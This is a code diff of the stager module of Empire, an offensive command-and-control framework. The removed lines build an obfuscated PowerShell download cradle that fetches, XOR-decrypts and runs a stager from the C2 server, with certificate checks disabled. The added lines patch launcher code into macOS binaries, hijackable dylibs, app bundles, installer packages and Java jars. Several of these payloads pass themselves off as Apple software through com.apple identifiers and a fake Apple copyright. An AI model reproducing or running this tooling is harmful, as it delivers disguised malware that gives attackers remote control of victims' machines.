@@ -1,15 +1,28 @@
 """
 
-Stager handling functionality for Empire.
+Functionality that loads Empire stagers, sets generic stager options,
+and abstracts the invocation of launcher generation.
+
+The Stagers() class in instantiated in ./empire.py by the main menu and includes:
+
+    load_stagers() - loads stagers from the install path
+    set_stager_option() - sets and option for all stagers
+    generate_launcher() - abstracted functionality that invokes the generate_launcher() method for a given listener
+    generate_dll() - generates a PowerPick Reflective DLL to inject with base64-encoded stager code
+    generate_macho() - generates a macho binary with an embedded python interpreter that runs the launcher code
+    generate_dylib() - generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application
 
 """
 
 import fnmatch
 import imp
-import http
 import helpers
-import encryption
 import os
+import macholib.MachO
+import shutil
+import zipfile
+import subprocess
+from itertools import izip, cycle
 import base64
 
 
@@ -18,31 +31,11 @@ class Stagers:
     def __init__(self, MainMenu, args):
 
         self.mainMenu = MainMenu
-
-        # pull the database connection object out of the main menu
-        self.conn = self.mainMenu.conn
-
         self.args = args
 
         # stager module format:
         #     [ ("stager_name", instance) ]
         self.stagers = {}
-
-        # pull out the code install path from the database config
-        cur = self.conn.cursor()
-        
-        cur.execute("SELECT install_path FROM config")
-        self.installPath = cur.fetchone()[0]
-
-        cur.execute("SELECT default_profile FROM config")
-        self.userAgent = (cur.fetchone()[0]).split("|")[1]
-
-        cur.close()
-
-        # pull out staging information from the main menu
-        self.stage0 = self.mainMenu.stage0
-        self.stage1 = self.mainMenu.stage1
-        self.stage2 = self.mainMenu.stage2
 
         self.load_stagers()
 
@@ -51,14 +44,20 @@ class Stagers:
         """
         Load stagers from the install + "/lib/stagers/*" path
         """
-        
-        rootPath = self.installPath + 'lib/stagers/'
+
+        rootPath = "%s/lib/stagers/" % (self.mainMenu.installPath)
         pattern = '*.py'
-         
+
+        print helpers.color("[*] Loading stagers from: %s" % (rootPath))
+
         for root, dirs, files in os.walk(rootPath):
             for filename in fnmatch.filter(files, pattern):
                 filePath = os.path.join(root, filename)
-                
+
+                # don't load up any of the templates
+                if fnmatch.fnmatch(filename, '*template.py'):
+                    continue
+
                 # extract just the module name from the full path
                 stagerName = filePath.split("/lib/stagers/")[-1][0:-3]
 
@@ -77,323 +76,37 @@ class Stagers:
                     stager.options[option]['Value'] = str(value)
 
 
-    def generate_stager(self, server, key, encrypt=True, encode=False):
+    def generate_launcher(self, listenerName, language=None, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', safeChecks='true'):
         """
-        Generate the PowerShell stager that will perform
-        key negotiation with the server and kick off the agent.
-
-        TODO: variable name replacement to change up transport size
-                ... other PowerShell obfuscation techniques?
-                    http://desktoplibrary.livelink-experts.com/obfuscate-powershell-user-manual ?
+        Abstracted functionality that invokes the generate_launcher() method for a given listener,
+        if it exists.
         """
 
-        # read in the stager base
-        f = open(self.installPath + "/data/agent/stager.ps1")
-        stager = f.read()
-        f.close()
+        if not listenerName in self.mainMenu.listeners.activeListeners:
+            print helpers.color("[!] Invalid listener: %s" % (listenerName))
+            return ''
 
-        # make sure the server ends with "/"
-        if not server.endswith("/"): server += "/"
+        activeListener = self.mainMenu.listeners.activeListeners[listenerName]
 
-        # patch the server and key information
-        stager = stager.replace("REPLACE_SERVER", server)
-        stager = stager.replace("REPLACE_STAGING_KEY", key)
-        stager = stager.replace("index.jsp", self.stage1)
-        stager = stager.replace("index.php", self.stage2)
-
-        randomizedStager = ""
-
-        for line in stager.split("\n"):
-            line = line.strip()
-            # skip commented line
-            if not line.startswith("#"):
-                # randomize capitalization of lines without quoted strings
-                if "\"" not in line:
-                    randomizedStager += helpers.randomize_capitalization(line)
-                else:
-                    randomizedStager += line
-
-        # base64 encode the stager and return it
-        if encode:
-            return helpers.enc_powershell(randomizedStager)
-        elif encrypt:
-            # return an encrypted version of the stager ("normal" staging)
-            return encryption.xor_encrypt(randomizedStager, key)
-        else:
-            # otherwise return the case-randomized stager
-            return randomizedStager
-
-
-    def generate_stager_hop(self, server, key, encrypt=True, encode=False):
-        """
-        Generate the PowerShell stager for hop.php redirectors that 
-        will perform key negotiation with the server and kick off the agent.
-        """
-
-        # read in the stager base
-        f = open(self.installPath + "./data/agent/stager_hop.ps1")
-        stager = f.read()
-        f.close()
-
-        # patch the server and key information
-        stager = stager.replace("REPLACE_SERVER", server)
-        stager = stager.replace("REPLACE_STAGING_KEY", key)
-        stager = stager.replace("index.jsp", self.stage1)
-        stager = stager.replace("index.php", self.stage2)
-
-        randomizedStager = ""
-
-        for line in stager.split("\n"):
-            line = line.strip()
-            # skip commented line
-            if not line.startswith("#"):
-                # randomize capitalization of lines without quoted strings
-                if "\"" not in line:
-                    randomizedStager += helpers.randomize_capitalization(line)
-                else:
-                    randomizedStager += line
+        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
         
-        # base64 encode the stager and return it
-        if encode:
-            return helpers.enc_powershell(randomizedStager)
-        elif encrypt:
-            # return an encrypted version of the stager ("normal" staging)
-            return encryption.xor_encrypt(randomizedStager, key)
-        else:
-            # otherwise return the case-randomized stager
-            return randomizedStager
-
-
-    def generate_agent(self, delay, jitter, profile, killDate, workingHours, lostLimit):
-        """
-        Generate "standard API" functionality, i.e. the actual agent.ps1 that runs.
-        
-        This should always be sent over encrypted comms.
-        """
-        f = open(self.installPath + "./data/agent/agent.ps1")
-        code = f.read()
-        f.close()
-
-        # strip out comments and blank lines
-        code = helpers.strip_powershell_comments(code)
-        b64DefaultPage = base64.b64encode(http.default_page())
-
-        # patch in the delay, jitter, lost limit, and comms profile
-        code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
-        code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-        code = code.replace('$Profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
-        code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-        code = code.replace('$DefaultPage = ""', '$DefaultPage = "'+b64DefaultPage+'"')
-
-        # patch in the killDate and workingHours if they're specified
-        if killDate != "":
-            code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
-        if workingHours != "":
-            code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
-
-        return code
-
-
-    # def generate_agent(self, sessionID):
-    #     """
-    #     Generate the agent code for a particulare sessionID.
-        
-    #     Used for on-disk persistence without needing staging.
-    #     Note: only use on reboot persistence, otherwise you'll get two agents running :)
-    #     """
-
-    #     if not self.mainMenu.agents.is_agent_present(sessionID):
-    #         print helpers.color("[!] Invalid sessionID specified for agent generation.")
-    #         return ""
-
-
-    #     f = open(self.installPath + "./data/agent/agent.ps1")
-    #     code = f.read()
-    #     f.close()
-
-    #     # strip out comments and blank lines
-    #     code = helpers.strip_powershell_comments(code)
-
-    #     # get the real sessionID based on the ID/name
-    #     agentSessionID = self.mainMenu.agents.get_agent_id(sessionID)
-
-    #     # get all agent information
-    #     agentInfo = self.mainMenu.agents.get_agent(agentSessionID)
-
-    #     # get (delay, jitter, profile, killDate, workingHours)
-    #     sessionID = agentInfo[1]
-    #     listener = agentInfo[2]
-    #     delay = agentInfo[4]
-    #     jitter = agentInfo[5]
-    #     sessionKey = agentInfo[14]
-    #     servers = agentInfo[19]
-    #     uris = agentInfo[20]
-    #     ua = agentInfo[22]
-    #     headers = agentInfo[23]
-    #     killDate = agentInfo[25]
-    #     workingHours = agentInfo[26]
-
-    #     profile = uris + "|" + ua
-
-    #     if not headers == "":
-    #         profile += "|" + headers
-
-    #     # patch in the delay, jitter, and comms profile, etc.
-    #     code = code.replace('$SessionID,', "$SessionID = \"%s\"," %(sessionID))
-    #     code = code.replace('$SessionKey,', "$SessionKey = \"%s\"," %(sessionKey))
-    #     code = code.replace('$Servers,', "$Servers = \"@('%s')\"," %(listener))
-    #     code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
-    #     code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-    #     code = code.replace('$Profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
-
-    #     # patch in the killDate and workingHours if they're specified
-    #     if killDate != "":
-    #         code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
-    #     if workingHours != "":
-    #         code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
-
-    #     return code
-
-
-    def generate_launcher_uri(self, server, encode=True, pivotServer="", hop=False):
-        """
-        Generate a base launcher URI.
-
-        This is used in the management/psinject module.
-        """
-
-        if hop:
-            # generate the base64 encoded information for the hop translation
-            checksum = "?" + helpers.encode_base64(server + "&" + self.stage0)
-        else:
-            # get a valid staging checksum uri
-            checksum = self.stage0
-
-        if pivotServer != "":
-            checksum += "?" + helpers.encode_base64(pivotServer)
-
-        if server.count("/") == 2 and not server.endswith("/"):
-            server += "/"
-
-        return server + checksum
-
-
-    def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default", stagerRetries="0"):
-        """
-        Generate the initial IEX download cradle with a specified
-        c2 server and a valid HTTP checksum.
-
-        listenerName -> a name of a validly registered listener
-
-        userAgent ->    "default" uses the UA from the default profile in the database
-                        "none" sets no user agent
-                        any other text is used as the user-agent
-        proxy ->        "default" uses the default system proxy 
-                        "none" sets no proxy
-                        any other text is used as the proxy
-
-        """
-
-        # if we don't have a valid listener, return nothing
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
-            print helpers.color("[!] Invalid listener: " + listenerName)
-            return ""
-
-        # extract the staging information from this specified listener
-        (server, stagingKey, pivotServer, hop, defaultDelay) = self.mainMenu.listeners.get_stager_config(listenerName)
-
-        # if UA is 'default', use the UA from the default profile in the database
-        if userAgent.lower() == "default":
-            userAgent = self.userAgent
-
-        # get the launching URI
-        URI = self.generate_launcher_uri(server, encode, pivotServer, hop)
-
-        stager = helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue = 0;")
-        stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
-        stager += "$u='"+userAgent+"';"
-
-        if "https" in URI:
-            # allow for self-signed certificates for https connections
-            stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-        
-        if userAgent.lower() != "none" or proxy.lower() != "none":
-            
-            if userAgent.lower() != "none":
-                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
-                stager += "'User-Agent',$u);"
-
-            if proxy.lower() != "none":
-                if proxy.lower() == "default":
-                    stager += helpers.randomize_capitalization("$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;")
-                else:
-                    # TODO: implement form for other proxy
-                    stager += helpers.randomize_capitalization("$proxy = new-object net.WebProxy;")
-                    stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
-                    stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
-                if proxyCreds.lower() == "default":
-                    stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
-                else:
-                    # TODO: implement form for other proxy credentials
-                    pass 
-
-        # the stub to decode the encrypted stager download by XOR'ing with the staging key
-        stager += helpers.randomize_capitalization("$K=")
-        stager += "'"+stagingKey+"';"
-
-        if(stagerRetries == "0"):
-            stager += helpers.randomize_capitalization("$i=0;[char[]]$b=([char[]]($wc.DownloadString(\"")
-            stager += URI
-            stager += helpers.randomize_capitalization("\")))|%{$_-bXor$k[$i++%$k.Length]};IEX ($b-join'')")
-        else:
-            # if there are a stager retries
-            stager += helpers.randomize_capitalization("$R=%s;do{try{$i=0;[cHAR[]]$B=([cHAR[]]($WC.DoWNLOadSTriNg(\"" %(stagerRetries))
-            stager += URI
-            stager += helpers.randomize_capitalization("\")))|%{$_-bXor$k[$i++%$k.Length]};IEX ($b-join''); $R=0;}catch{sleep "+str(defaultDelay)+";$R--}} while ($R -gt 0)")
-
-        # base64 encode the stager and return it
-        if encode:
-            return helpers.powershell_launcher(stager)
-        else:
-            # otherwise return the case-randomized stager
-            return stager
-
-
-    def generate_hop_php(self, server, resources):
-        """
-        Generates a hop.php file with the specified target server 
-        and resource URIs.
-        """
-
-        # read in the hop.php base
-        f = open(self.installPath + "/data/misc/hop.php")
-        hop = f.read()
-        f.close()
-
-        # make sure the server ends with "/"
-        if not server.endswith("/"): server += "/"
-
-        # patch in the server and resources
-        hop = hop.replace("REPLACE_SERVER", server)
-        hop = hop.replace("REPLACE_RESOURCES", resources)
-
-        return hop
+        if launcherCode:
+            return launcherCode
 
 
     def generate_dll(self, poshCode, arch):
         """
-        Generate a PowerPick Reflective DLL to inject with base64-encoded
-        stager code.
+        Generate a PowerPick Reflective DLL to inject with base64-encoded stager code.
         """
 
         #read in original DLL and patch the bytes based on arch
-        if arch.lower() == "x86":  
-            origPath = self.installPath + "/data/misc/ReflectivePick_x86_orig.dll"
+        if arch.lower() == 'x86':
+            origPath = "%s/data/misc/ReflectivePick_x86_orig.dll" % (self.mainMenu.installPath)
         else:
-            origPath = self.installPath + "/data/misc/ReflectivePick_x64_orig.dll"
+            origPath = "%s/data/misc/ReflectivePick_x64_orig.dll" % (self.mainMenu.installPath)
 
         if os.path.isfile(origPath):
-            
+
             dllRaw = ''
             with open(origPath, 'rb') as f:
                 dllRaw = f.read()
@@ -408,6 +121,333 @@ class Stagers:
                 return dllPatched
 
         else:
-            print helpers.color("[!] Original .dll for arch "+arch+" does not exist!")
+            print helpers.color("[!] Original .dll for arch %s does not exist!" % (arch))
 
 
+    def generate_macho(self, launcherCode):
+        """
+        Generates a macho binary with an embedded python interpreter that runs the launcher code.
+        """
+
+        MH_EXECUTE = 2
+        f = open("%s/data/misc/machotemplate" % (self.mainMenu.installPath), 'rb')
+        # f = open(self.installPath + "/data/misc/machotemplate", 'rb')
+        macho = macholib.MachO.MachO(f.name)
+
+        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
+            print helpers.color("[!] Macho binary template is not the correct filetype")
+            return ""
+
+        cmds = macho.headers[0].commands
+
+        for cmd in cmds:
+            count = 0
+            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
+                count += 1
+                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                    count += 1
+                    for section in cmd[count]:
+                        if section.sectname.strip('\x00') == '__cstring':
+                            offset = int(section.offset) + (int(section.size) - 2119)
+                            placeHolderSz = int(section.size) - (int(section.size) - 2119)
+
+        template = f.read()
+        f.close()
+
+        if placeHolderSz and offset:
+
+            key = 'subF'
+            launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(launcherCode, cycle(key)))
+            launcherCode = base64.urlsafe_b64encode(launcherCode)
+            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
+
+            return patchedMachO
+        else:
+            print helpers.color("[!] Unable to patch MachO binary")
+
+
+    def generate_dylib(self, launcherCode, arch, hijacker):
+        """
+        Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
+        """
+        import macholib.MachO
+
+        MH_DYLIB = 6
+        if hijacker.lower() == 'true':
+            if arch == 'x86':
+                f = open("%s/data/misc/hijackers/template.dylib" % (self.mainMenu.installPath), 'rb')
+            else:
+                f = open("%s/data/misc/hijackers/template64.dylib" % (self.mainMenu.installPath), 'rb')
+        else:
+            if arch == 'x86':
+                f = open("%s/data/misc/templateLauncher.dylib" % (self.mainMenu.installPath), 'rb')
+            else:
+                f = open("%s/data/misc/templateLauncher64.dylib" % (self.mainMenu.installPath), 'rb')
+
+        macho = macholib.MachO.MachO(f.name)
+
+        if int(macho.headers[0].header.filetype) != MH_DYLIB:
+            print helpers.color("[!] Dylib template is not the correct filetype")
+            return ""
+
+        cmds = macho.headers[0].commands
+
+        for cmd in cmds:
+            count = 0
+            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
+                count += 1
+                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                    count += 1
+                    for section in cmd[count]:
+                        if section.sectname.strip('\x00') == '__cstring':
+                            offset = int(section.offset)
+                            placeHolderSz = int(section.size) - 52
+        template = f.read()
+        f.close()
+
+        if placeHolderSz and offset:
+
+            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            patchedDylib = template[:offset]+launcher+template[(offset+len(launcher)):]
+
+            return patchedDylib
+        else:
+            print helpers.color("[!] Unable to patch dylib")
+
+
+    def generate_appbundle(self, launcherCode, Arch, icon, AppName, disarm):
+
+        """
+        Generates an application. The embedded executable is a macho binary with the python interpreter.
+        """
+
+        
+
+        MH_EXECUTE = 2
+
+        if Arch == 'x64':
+
+            f = open(self.mainMenu.installPath + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher")
+            directory = self.mainMenu.installPath + "/data/misc/apptemplateResources/x64/launcher.app/"
+        else:
+            f = open(self.mainMenu.installPath + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher")
+            directory = self.mainMenu.installPath + "/data/misc/apptemplateResources/x86/launcher.app/"
+
+        macho = macholib.MachO.MachO(f.name)
+
+        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
+            print helpers.color("[!] Macho binary template is not the correct filetype")
+            return ""
+
+        cmds = macho.headers[0].commands
+
+        for cmd in cmds:
+            count = 0
+            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
+                count += 1
+                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                    count += 1
+                    for section in cmd[count]:
+                        if section.sectname.strip('\x00') == '__cstring':
+                            offset = int(section.offset)
+                            placeHolderSz = int(section.size) - 52
+
+        template = f.read()
+        f.close()
+
+        if placeHolderSz and offset:
+
+            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            patchedBinary = template[:offset]+launcher+template[(offset+len(launcher)):]
+            if AppName == "":
+                AppName = "launcher"
+
+            tmpdir = "/tmp/application/%s.app/" % AppName
+            shutil.copytree(directory, tmpdir)
+            f = open(tmpdir + "Contents/MacOS/launcher","wb")
+            if disarm != True:
+                f.write(patchedBinary)
+                f.close()
+            else:
+                t = open(self.mainMenu.installPath+"/data/misc/apptemplateResources/empty/macho",'rb')
+                w = t.read()
+                f.write(w)
+                f.close()
+                t.close()
+
+            os.rename(tmpdir + "Contents/MacOS/launcher",tmpdir + "Contents/MacOS/%s" % AppName)
+            os.chmod(tmpdir+"Contents/MacOS/%s" % AppName, 0755)
+
+            if icon != '':
+                iconfile = os.path.splitext(icon)[0].split('/')[-1]
+                shutil.copy2(icon,tmpdir+"Contents/Resources/"+iconfile+".icns")
+            else:
+                iconfile = icon
+            appPlist = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>BuildMachineOSBuild</key>
+    <string>15G31</string>
+    <key>CFBundleDevelopmentRegion</key>
+    <string>en</string>
+    <key>CFBundleExecutable</key>
+    <string>%s</string>
+    <key>CFBundleIconFile</key>
+    <string>%s</string>
+    <key>CFBundleIdentifier</key>
+    <string>com.apple.%s</string>
+    <key>CFBundleInfoDictionaryVersion</key>
+    <string>6.0</string>
+    <key>CFBundleName</key>
+    <string>%s</string>
+    <key>CFBundlePackageType</key>
+    <string>APPL</string>
+    <key>CFBundleShortVersionString</key>
+    <string>1.0</string>
+    <key>CFBundleSignature</key>
+    <string>????</string>
+    <key>CFBundleSupportedPlatforms</key>
+    <array>
+        <string>MacOSX</string>
+    </array>
+    <key>CFBundleVersion</key>
+    <string>1</string>
+    <key>DTCompiler</key>
+    <string>com.apple.compilers.llvm.clang.1_0</string>
+    <key>DTPlatformBuild</key>
+    <string>7D1014</string>
+    <key>DTPlatformVersion</key>
+    <string>GM</string>
+    <key>DTSDKBuild</key>
+    <string>15E60</string>
+    <key>DTSDKName</key>
+    <string>macosx10.11</string>
+    <key>DTXcode</key>
+    <string>0731</string>
+    <key>DTXcodeBuild</key>
+    <string>7D1014</string>
+    <key>LSApplicationCategoryType</key>
+    <string>public.app-category.utilities</string>
+    <key>LSMinimumSystemVersion</key>
+    <string>10.11</string>
+    <key>LSUIElement</key>
+    <true/>
+    <key>NSHumanReadableCopyright</key>
+    <string>Copyright 2016 Apple. All rights reserved.</string>
+    <key>NSMainNibFile</key>
+    <string>MainMenu</string>
+    <key>NSPrincipalClass</key>
+    <string>NSApplication</string>
+</dict>
+</plist>
+""" % (AppName, iconfile, AppName, AppName)
+            f = open(tmpdir+"Contents/Info.plist", "w")
+            f.write(appPlist)
+            f.close()
+
+            shutil.make_archive("/tmp/launcher", 'zip', "/tmp/application")
+            shutil.rmtree('/tmp/application')
+
+            f = open("/tmp/launcher.zip","rb")
+            zipbundle = f.read()
+            f.close()
+            os.remove("/tmp/launcher.zip")
+            return zipbundle
+        
+            
+        else:
+            print helpers.color("[!] Unable to patch application")
+
+    def generate_pkg(self, launcher, bundleZip, AppName):
+
+        #unzip application bundle zip. Copy everything for the installer pkg to a temporary location
+        currDir = os.getcwd()
+        os.chdir("/tmp/")
+        f = open("app.zip","wb")
+        f.write(bundleZip)
+        f.close()
+        zipf = zipfile.ZipFile('app.zip','r')
+        zipf.extractall()
+        zipf.close()
+        os.remove('app.zip')
+
+        os.system("cp -r "+self.mainMenu.installPath+"/data/misc/pkgbuild/ /tmp/")
+        os.chdir("pkgbuild")
+        os.system("cp -r ../"+AppName+".app root/Applications/")
+        os.system("chmod +x root/Applications/")
+        os.system("( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload")
+        os.system("chmod +x expand/Payload")
+        s = open('scripts/postinstall','r+')
+        script = s.read()
+        script = script.replace('LAUNCHER',launcher)
+        s.seek(0)
+        s.write(script)
+        s.close()
+        os.system("( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts")
+        os.system("chmod +x expand/Scripts")
+        numFiles = subprocess.check_output("find root | wc -l",shell=True).strip('\n')
+        size = subprocess.check_output("du -b -s root",shell=True).split('\t')[0]
+        size = int(size) / 1024
+        p = open('expand/PackageInfo','w+')
+        pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
+    <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
+    <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
+    <bundle-version>
+        <bundle id="com.apple.APPNAME"/>
+    </bundle-version>
+    <upgrade-bundle>
+        <bundle id="com.apple.APPNAME"/>
+    </upgrade-bundle>
+    <update-bundle/>
+    <atomic-update-bundle/>
+    <strict-identifier>
+        <bundle id="com.apple.APPNAME"/>
+    </strict-identifier>
+    <relocate>
+        <bundle id="com.apple.APPNAME"/>
+    </relocate>
+    <scripts>
+        <postinstall file="./postinstall"/>
+    </scripts>
+</pkg-info>
+"""
+        pkginfo = pkginfo.replace('APPNAME',AppName)
+        pkginfo = pkginfo.replace('KEY1',numFiles)
+        pkginfo = pkginfo.replace('KEY2',str(size))
+        p.write(pkginfo)
+        p.close()
+        os.system("mkbom -u 0 -g 80 root expand/Bom")
+        os.system("chmod +x expand/Bom")
+        os.system("chmod -R 755 expand/")
+        os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
+        f = open('launcher.pkg','rb')
+        package = f.read()
+        os.chdir("/tmp/")
+        shutil.rmtree('pkgbuild')
+        shutil.rmtree(AppName+".app")
+        return package
+
+    def generate_jar(self, launcherCode):
+        file = open(self.mainMenu.installPath+'data/misc/Run.java','r')
+        javacode = file.read()
+        file.close()
+        javacode = javacode.replace("LAUNCHER",launcherCode)
+        file = open(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java','w')
+        file.write(javacode)
+        file.close()
+        currdir = os.getcwd()
+        os.chdir(self.mainMenu.installPath+'data/misc/classes/')
+        os.system('javac com/installer/apple/Run.java')
+        os.system('jar -cfe '+self.mainMenu.installPath+'Run.jar com.installer.apple.Run com/installer/apple/Run.class')
+        os.chdir(currdir)
+        os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.class')
+        os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java')
+        jarfile = open('Run.jar','rb')
+        jar = jarfile.read()
+        jarfile.close()
+        os.remove('Run.jar')
+
+        return jar 
